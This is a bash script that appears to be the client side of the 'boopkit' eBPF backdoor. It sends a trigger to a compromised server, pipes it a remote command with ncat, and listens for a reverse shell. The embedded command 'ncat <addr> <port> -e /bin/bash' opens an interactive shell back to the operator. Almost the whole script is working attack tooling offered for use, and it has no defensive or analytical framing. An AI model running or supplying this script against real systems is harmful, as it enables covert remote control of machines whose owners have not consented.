#!/bin/bash

# Destination address.
#
# This is the IP address of the server that is running
# boopkit. As long as the server that has boopkit
# installed is also listening on ANY tcp connect, we
# can point this file at the server to run an RCE.
DST_ADDR="127.0.0.1"
DST_PORT="8080"

# Source address.
#
# This is the local (public) IP address that will
# need to listen in order for boopkit to dial back
#
# The protocol switches ports midway through, so
# two specific ports will need to be used! One to
# specify the RCE command to run, and another to
# use for a reverse shell (if necessary).
SRC_ADDR="127.0.0.1"
SRC_PORT="3535"
RCE_PORT="3545"

# Ncat command. This is used on both the local machine
# and on the server!
NCAT="/usr/bin/ncat"

# Remote Command Execution
#
# The remote command to run on the server!
# ================================================
RCE="ncat ${SRC_ADDR} ${RCE_PORT} -e /bin/bash &"
# ================================================

# Trigger is used to fire the eBPF probe on the server.
trigger(){
    sleep 1
    # ./trigger <source-ip> <target-ip> <port>
    ./trigger ${SRC_ADDR} ${DST_ADDR} ${DST_PORT}
}

# Check for permissions to host a local socket.
if [ "$EUID" -ne 0 ]
  then echo "Permission denied."
  exit
fi

# Right away trigger the backdoor on the server
trigger &

# After the remote has been triggered
# Send over the command to inject using netcat
# reverse transmission.
echo "Remote executing: ${RCE}"
echo "${NCAT} -lp ${SRC_PORT}"
echo ${RCE} | ${NCAT} -lp ${SRC_PORT} &


# Also begin listening for the return RCE
#
# Note: this is only required if you are performing
# a reverse shell!
${NCAT} -lvp ${RCE_PORT}
